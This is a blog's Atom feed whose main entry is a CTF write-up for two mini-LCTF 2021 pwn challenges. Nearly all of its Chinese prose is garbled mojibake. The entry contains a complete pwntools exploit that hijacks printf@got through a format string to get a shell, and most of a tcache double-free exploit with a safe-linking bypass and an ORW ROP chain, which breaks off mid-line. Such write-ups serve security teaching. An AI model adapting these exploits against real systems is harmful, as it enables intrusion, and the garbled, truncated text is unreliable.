<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>arttnba3&#39;s old blog</title>
  
  <subtitle>- arttnba3çš„åƒåœ¾å †ç§¯å¤„ -</subtitle>
  <link href="http://archive.next.arttnba3.cn/atom.xml" rel="self"/>
  
  <link href="http://archive.next.arttnba3.cn/"/>
  <updated>2023-05-15T11:16:54.013Z</updated>
  <id>http://archive.next.arttnba3.cn/</id>
  
  <author>
    <name>arttnba3</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>æ­¤é¡µé¢ä¸ºä¸Šå¤æ—¶æœŸåƒåœ¾å †ç§¯å¤„ï¼Œæ–°åšå®¢åœ°å€ï¼šarttnba3.cn</title>
    <link href="http://archive.next.arttnba3.cn/2077/04/26/goodbye-world/"/>
    <id>http://archive.next.arttnba3.cn/2077/04/26/goodbye-world/</id>
    <published>2077-04-26T13:35:18.000Z</published>
    <updated>2023-05-15T11:16:54.013Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-ç»ªè®º"><a href="#0x00-ç»ªè®º" class="headerlink" title="0x00. ç»ªè®º"></a>0x00. ç»ªè®º</h1><p>å› ä¸ºå†™äº†å¤ªå¤šåƒåœ¾ï¼Œè¿™ä¸ªä¸Šå¤æ—¶æœŸçš„åšå®¢å·²ç»åºŸå¼ƒå•¦ï¼ï¼ˆä½ ç”šè‡³èƒ½å¤Ÿåœ¨åŸŸåé‡Œçœ‹åˆ°ä¸€ä¸ª <code>archive</code> å‘œå‘œï¼‰</p><p>æ–°åšå®¢ï¼Œæ–°å¼€å§‹æï¼š <a href="https://arttnba3.github.io/">arttnba3.cn</a></p><span id="more"></span><h1 id="0x01-æ˜æ˜çŸ¥é“è¿™é‡Œåº”è¯¥æ²¡æœ‰ä¸œè¥¿äº†è¿˜ç‚¹è¿›æ¥å¹²å˜›ï¼Œç»™ä½ ä¸€æ‹³ğŸ‘ŠğŸ‘ŠğŸ‘Š"><a href="#0x01-æ˜æ˜çŸ¥é“è¿™é‡Œåº”è¯¥æ²¡æœ‰ä¸œè¥¿äº†è¿˜ç‚¹è¿›æ¥å¹²å˜›ï¼Œç»™ä½ ä¸€æ‹³ğŸ‘ŠğŸ‘ŠğŸ‘Š" class="headerlink" title="0x01. æ˜æ˜çŸ¥é“è¿™é‡Œåº”è¯¥æ²¡æœ‰ä¸œè¥¿äº†è¿˜ç‚¹è¿›æ¥å¹²å˜›ï¼Œç»™ä½ ä¸€æ‹³ğŸ‘ŠğŸ‘ŠğŸ‘Š"></a>0x01. æ˜æ˜çŸ¥é“è¿™é‡Œåº”è¯¥æ²¡æœ‰ä¸œè¥¿äº†è¿˜ç‚¹è¿›æ¥å¹²å˜›ï¼Œç»™ä½ ä¸€æ‹³ğŸ‘ŠğŸ‘ŠğŸ‘Š</h1>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x00-ç»ªè®º&quot;&gt;&lt;a href=&quot;#0x00-ç»ªè®º&quot; class=&quot;headerlink&quot; title=&quot;0x00. ç»ªè®º&quot;&gt;&lt;/a&gt;0x00. ç»ªè®º&lt;/h1&gt;&lt;p&gt;å› ä¸ºå†™äº†å¤ªå¤šåƒåœ¾ï¼Œè¿™ä¸ªä¸Šå¤æ—¶æœŸçš„åšå®¢å·²ç»åºŸå¼ƒå•¦ï¼ï¼ˆä½ ç”šè‡³èƒ½å¤Ÿåœ¨åŸŸåé‡Œçœ‹åˆ°ä¸€ä¸ª &lt;code&gt;archive&lt;/code&gt; å‘œå‘œï¼‰&lt;/p&gt;
&lt;p&gt;æ–°åšå®¢ï¼Œæ–°å¼€å§‹æï¼š &lt;a href=&quot;https://arttnba3.github.io/&quot;&gt;arttnba3.cn&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>ã€CTFé¢˜è§£-0x09ã€‘mini-LCTF 2021 official write up by arttnba3</title>
    <link href="http://archive.next.arttnba3.cn/2021/05/14/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x09%E3%80%91mini-LCTF-2021/"/>
    <id>http://archive.next.arttnba3.cn/2021/05/14/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x09%E3%80%91mini-LCTF-2021/</id>
    <published>2021-05-14T11:31:34.000Z</published>
    <updated>2021-12-29T21:00:12.219Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-ç»ªè®º"><a href="#0x00-ç»ªè®º" class="headerlink" title="0x00.ç»ªè®º"></a>0x00.ç»ªè®º</h1><p>å¾ˆé«˜å…´èƒ½å’ŒRXå¤§å“¥å’Œåä¼šçš„å…¶ä»–å¸ˆå‚…ä¸€èµ·å‡ºäº†è¿™ä¸€æ¬¡ minilCTF 2021 çš„é¢˜ï¼Œè™½ç„¶è¯´åªå‡ºäº†ä¸¤é“æ¯”è¾ƒç®€å•çš„é¢˜233333ï¼Œä¸è¿‡è¿˜æ˜¯å¸Œæœ›å¤§å®¶èƒ½å¤Ÿå–œæ¬¢ï¼ˆï¼‰</p><p>ç‚¹å¼€ä¸‹æ–¹æŸ¥çœ‹é¢˜è§£ğŸ‘‡</p><span id="more"></span><h1 id="0x01-Baby-Repeater-fmtstr-got-hijack"><a href="#0x01-Baby-Repeater-fmtstr-got-hijack" class="headerlink" title="0x01.Baby Repeater - fmtstr + got hijack"></a>0x01.Baby Repeater - fmtstr + got hijack</h1><p>é¢„æœŸæ˜¯åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ² libc å’Œ ç¨‹åºåŠ è½½åŸºåœ°å€ï¼Œä¹‹ååˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²åŠ«æŒ got è¡¨ï¼Œæ¯”è¾ƒæ–¹ä¾¿çš„å°±æ˜¯æ”¹ printf ä¸º systemï¼Œåªç”¨ä¿®æ”¹3ä¸ªå­—èŠ‚ï¼Œä¹Ÿçœ‹åˆ°æœ‰äººé€‰æ‹©æ”¹ä¸º one_gadget çš„ï¼ŒåŸºæœ¬ä¸Šéƒ½åœ¨é¢„æœŸå†…</p><h2 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h2><p>æ¼æ´ç‚¹æ¯”è¾ƒæ˜æ˜¾ï¼Œä¸€ä¸ªå¯ä»¥æ— é™ä½¿ç”¨çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p><p>ç®€å•æµ‹ä¸€ä¸‹ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²æ˜¯æ ˆä¸Šçš„ç¬¬å…«ä¸ªå‚æ•°</p><p><img src="https://i.loli.net/2021/04/23/8kAW31PorMOVBsa.png" alt="image.png"></p><p>checksecä¸€ä¸‹ï¼Œå‘ç°no relroï¼Œé‚£å°±ç›´æ¥åˆ©ç”¨æ ¼å¼å­—ç¬¦ä¸²æ¼æ´æ³„éœ²ç¨‹åºåŠ è½½åŸºåœ°å€ä¸ libc åŸºå€åæ”¹ printf@got ä¸º system åè¾“å…¥ <code>;sh</code> å°±å¯ä»¥æ‹¿åˆ° shell äº†</p><p>expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./baby_repeater&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./baby_repeater&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;%107$p&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; Your sentence: &quot;</span>)</span><br><span class="line">main_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">16</span>) - <span class="number">42</span></span><br><span class="line">elf_base = main_addr - e.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;elf base: &#x27;</span> + <span class="built_in">hex</span>(elf_base))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;%111$p&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; Your sentence: &quot;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">16</span>) - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>] - <span class="number">243</span></span><br><span class="line">log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">printf_got = elf_base + e.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sys_low = sys_addr &amp; <span class="number">0xffff</span></span><br><span class="line">sys_high = (sys_addr &gt;&gt; <span class="number">16</span>)  &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(sys_high - <span class="number">15</span>).encode() + <span class="string">b&#x27;c%12$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(sys_low - sys_high).encode() + <span class="string">b&#x27;c%13$hn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">4</span> * <span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(printf_got + <span class="number">2</span>)</span><br><span class="line">payload += p64(printf_got)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;;sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x02-easytcache-Use-After-Free-safe-linking-bypass-ORW-ï¼ˆ-FSOPï¼‰"><a href="#0x02-easytcache-Use-After-Free-safe-linking-bypass-ORW-ï¼ˆ-FSOPï¼‰" class="headerlink" title="0x02. easytcache - Use After Free + safe-linking bypass + ORW ï¼ˆ+ FSOPï¼‰"></a>0x02. easytcache - Use After Free + safe-linking bypass + ORW ï¼ˆ+ FSOPï¼‰</h1><p>è¿™é“é¢˜æ ¡å†…æ²¡äººå‡ºâ€¦.åªæœ‰ä¸€ä¸ªæ ¡å¤–çš„å¸ˆå‚…åšå‡ºæ¥äº†ï¼Œè¿˜éé¢„æœŸäº†â€¦â€¦</p><p>BBï¼š</p><p><img src="https://i.loli.net/2021/05/15/Oqpem3yrg2UJlYC.png" alt="image.png"></p><h2 id="ç¨‹åºåˆ†æ"><a href="#ç¨‹åºåˆ†æ" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h2><p>ä½¿ç”¨å¦‚ä¸‹æŒ‡ä»¤ç¼–è¯‘ï¼Œä¿æŠ¤å…¨å¼€ï¼Œæ‰£å…‰ç¬¦å·è¡¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ g++ easytcache.cpp -o easytcache -fstack-protector-all -z now -z noexecstack -pie -s</span><br></pre></td></tr></table></figure><p>åœ¨å¼€å¤´çš„<code>init_state()</code>å‡½æ•°ä¸­è®¾ç½®äº†æ²™ç®±ï¼Œç›®çš„æ˜¯è®©é€‰æ‰‹åªèƒ½é€šè¿‡orwæ¥è·å¾—flag</p><p>é¢˜ç›®æä¾›äº†åˆ†é…ã€ç¼–è¾‘ã€æ‰“å°ã€é‡Šæ”¾å †å—çš„åŠŸèƒ½ï¼Œä»¥åŠä¸€ä¸ªæ‰‹åŠ¨è°ƒç”¨exitå‡½æ•°é€€å‡ºçš„åŠŸèƒ½</p><p>åŒæ—¶é¢˜ç›®é™åˆ¶<strong>åªèƒ½åˆ†é…5ä¸ªchunkï¼Œåªèƒ½é‡Šæ”¾3æ¬¡</strong>ï¼Œè¶…å‡ºè¿™ä¸ªé™åˆ¶ä¾¿ä¼šæŠ›å‡º<code>A3LibException</code>ä¸­æ­¢ç¨‹åº</p><p>æ¼æ´ç‚¹åœ¨äºé‡Šæ”¾å †å—æ—¶æ²¡æœ‰å°†å †å—æŒ‡é’ˆç½®0ï¼Œä½†æ˜¯libcç‰ˆæœ¬ä¸º2.33ï¼Œæœ‰ç€tcache keyï¼Œæ— æ³•ç›´æ¥double free</p><p>é¢˜ç›®æœ¬èº«æœ‰ä¸ªé€»è¾‘æ¼æ´ï¼Œåœ¨ <code>deleteNote()</code> å‡½æ•°ä¸­è™½ç„¶ä¼šæ£€æµ‹å †å—æ˜¯å¦å·²é‡Šæ”¾ï¼Œä½†æ˜¯ä¼šåœ¨æ£€æµ‹ä¹‹å‰ä½¿ç”¨å–åçš„æ–¹å¼æ”¹å˜æ ‡å¿—ä½ï¼Œå› æ­¤å¯ä»¥åœ¨æ”¹å˜æ ‡å¿—ä½åä½¿ç”¨ edit åŠŸèƒ½æ¸…é™¤ tcache keyï¼Œä¹‹åå®Œæˆdoule free</p><h2 id="è§£é¢˜æ€è·¯-1"><a href="#è§£é¢˜æ€è·¯-1" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h2><p>é¢˜ç›®é™åˆ¶äº†åªèƒ½åˆ†é…5ä¸ª chunkï¼Œæ¯ä¸€æ¬¡åˆ†é…éƒ½éœ€è¦ç²¾æ‰“ç»†ç®—ï¼Œä¸ºäº†èƒ½å¤Ÿè¾¾åˆ°æ›´å¤šæ¬¡çš„ä»»æ„åœ°å€å†™ï¼Œæ‰€ä»¥è€ƒè™‘ç›´æ¥åŠ«æŒ tcache ç»“æ„ä½“</p><p>é¦–å…ˆé€šè¿‡double freeåæ‰“å°æ³„æ¼å‡ºå †åŸºå€ï¼Œä¹‹åå°±æ˜¯ edit ååˆ†é…åˆ° tcache ç»“æ„ä½“ï¼Œä¿®æ”¹ counts å…¨æ»¡å<strong>å°† tcache free è¿› unsorted bin å</strong>æ‰“å°å°±å¯ä»¥æ³„æ¼å‡ºæ ˆåŸºå€ï¼Œ<strong>æ­¤æ—¶æˆ‘ä»¬è¿˜å‰©ä¸‹ä¸¤æ¬¡ malloc çš„æœºä¼šï¼Œ0 æ¬¡ free çš„æœºä¼š</strong>ï¼Œä¸è¿‡å¥½åœ¨æˆ‘ä»¬å·²ç»æ§åˆ¶äº† tcache ç»“æ„ä½“ï¼Œå¯ä»¥ç›´æ¥åˆ†é…å †å—åˆ°æˆ‘ä»¬æƒ³è¦çš„åœ°æ–¹<br>éœ€è¦æ³¨æ„çš„æ˜¯è‡ª libc2.32 èµ·æ–°å¢äº† safe-linking æœºåˆ¶ï¼ˆæœ¬é¢˜ä¸º 2.33ï¼‰ï¼Œå¯¹äº tcache ä¸ fastbin ä¸­çš„ chunk çš„ next æŒ‡é’ˆéƒ½ä¼šä¸è‡ªèº«åœ°å€å³ç§» 12 ä½åçš„å€¼è¿›è¡Œå¼‚æˆ–ï¼Œä½†æ˜¯ tcache_entry ä¸­å­˜æ”¾çš„ä»ç„¶ä¸ºæœªåŠ å¯†æŒ‡é’ˆ</p><p>æœ€å¸¸è§„çš„åŠæ³•å°±æ˜¯æ”¹ __malloc_hook ä¸º one_gadget ä»¥get shellï¼Œä½†æ˜¯è¿™ä¸€é¢˜é™åˆ¶äº†ç³»ç»Ÿè°ƒç”¨ï¼Œåªèƒ½è¿›è¡Œorw</p><p><img src="https://i.loli.net/2021/04/22/EA873jmk2bIy4ca.png" alt="image.png"></p><h3 id="è§£æ³•ä¸€ï¼š-environæ³„éœ²æ ˆåœ°å€åœ¨æ ˆä¸Šæ„é€ ROPè¿›è¡ŒORW"><a href="#è§£æ³•ä¸€ï¼š-environæ³„éœ²æ ˆåœ°å€åœ¨æ ˆä¸Šæ„é€ ROPè¿›è¡ŒORW" class="headerlink" title="è§£æ³•ä¸€ï¼š__environæ³„éœ²æ ˆåœ°å€åœ¨æ ˆä¸Šæ„é€ ROPè¿›è¡ŒORW"></a>è§£æ³•ä¸€ï¼š__environæ³„éœ²æ ˆåœ°å€åœ¨æ ˆä¸Šæ„é€ ROPè¿›è¡ŒORW</h3><p>åœ¨ <code>__environ</code> è¿™ä¸ªå˜é‡ä¸­ä¿å­˜ç€æ ˆä¸Šåœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªå˜é‡è·å–æ ˆä¸Šåœ°å€ï¼Œéšåå°±å¯ä»¥åˆ†é…ä¸€ä¸ªä½äºæ ˆä¸Šçš„ chunk ï¼Œæœ€åå°±æ˜¯å¸¸è§„çš„é€šè¿‡ ROP è¿›è¡Œ ORW</p><p>expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&#x27;./ld-2.33.so&#x27;</span>, <span class="string">&#x27;./easytcache&#x27;</span>], env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>:<span class="string">&#x27;./libc.so.6&#x27;</span>&#125;)<span class="comment">#p = remote(&#x27;pwn.woooo.tech&#x27;, 10071)#</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./easytcache&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">one_gadget = <span class="number">0xe6e73</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Your choice: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;index?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;content?&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;index?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;content: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;index?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="comment"># tcache double free</span></span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx0</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the heap base</span></span><br><span class="line">    log.info(<span class="string">&quot;start leaking the heap base addr...&quot;</span>)</span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    dump(<span class="number">0</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    heap_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">    heap_base = heap_leak - <span class="number">0x10</span></span><br><span class="line">    log.success(<span class="string">&#x27;heap base leak: &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(heap_base)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># tcache poisoning, hijack the tcache struct</span></span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">2</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">0</span>, p64((heap_base + <span class="number">0x10</span>) ^ ((heap_base + <span class="number">0x290</span> + <span class="number">0x11c10</span> + <span class="number">0x10</span>) &gt;&gt; <span class="number">12</span>)))</span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx1</span></span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx2, our fake chunk based on tcache manager</span></span><br><span class="line">    edit(<span class="number">2</span>, <span class="string">b&#x27;\x00\x00&#x27;</span> * <span class="number">39</span> + <span class="string">b&#x27;\x07\x00&#x27;</span>) <span class="comment"># set it full</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the libc base</span></span><br><span class="line">    log.info(<span class="string">&quot;start leaking the libc base addr...&quot;</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="string">b&#x27;\x0a&#x27;</span>)</span><br><span class="line">    dump(<span class="number">2</span>)</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">96</span> - <span class="number">0xa</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base leak: &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">    edit(<span class="number">2</span>, (<span class="string">b&quot;\x01\x00&quot;</span>).ljust(<span class="number">128</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;__environ&#x27;</span>] - <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct the orw rop chain</span></span><br><span class="line">    log.info(<span class="string">&quot;start constructing the orw rop chain...&quot;</span>)</span><br><span class="line">    flag_addr = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    pop_rdi_ret = libc_base + libc.search(asm(<span class="string">&quot;pop rdi ; ret&quot;</span>)).__next__()</span><br><span class="line">    log.success(<span class="built_in">hex</span>(pop_rdi_ret))</span><br><span class="line">    pop_rsi_ret = libc_base + libc.search(asm(<span class="string">&quot;pop rsi ; ret&quot;</span>)).__next__()</span><br><span class="line">    pop_rdx_ret = libc_base + libc.search(asm(<span class="string">&quot;pop rdx ; ret&quot;</span>)).__next__()</span><br><span class="line">    pop_rdx_pop_rbx_ret = libc_base + libc.search(asm(<span class="string">&#x27;pop rdx ; pop rbx ; ret&#x27;</span>)).__next__()</span><br><span class="line">    ret = libc_base + libc.search(asm(<span class="string">&#x27;ret&#x27;</span>)).__next__()</span><br><span class="line"></span><br><span class="line">    orw = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    orw += <span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">3</span> + p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_pop_rbx_ret) + p64(<span class="number">0x40</span>) + p64(<span class="number">0</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">    orw += p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(<span class="number">4</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">    orw += p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_pop_rbx_ret) + p64(<span class="number">0x40</span>) + p64(<span class="number">0</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">    orw += p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_pop_rbx_ret) + p64(<span class="number">0x40</span>) + p64(<span class="number">0</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">    log.success(<span class="string">&quot;construction complete&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the stack addr</span></span><br><span class="line">    new(<span class="number">0x10</span>) <span class="comment"># idx 3, fake chunk on __environ</span></span><br><span class="line">    edit(<span class="number">3</span>, <span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">2</span>)</span><br><span class="line">    dump(<span class="number">3</span>)</span><br><span class="line">    __environ = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">    log.success(<span class="string">&#x27;stack addr leak: &#x27;</span> + <span class="built_in">hex</span>(__environ))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the flag</span></span><br><span class="line">    log.info(<span class="string">&quot;start sending the orw rop chain...&quot;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    edit(<span class="number">2</span>, (<span class="string">b&quot;\x00\x00&quot;</span> * <span class="number">15</span> + <span class="string">b&#x27;\x01\x00&#x27;</span>).ljust(<span class="number">128</span>, <span 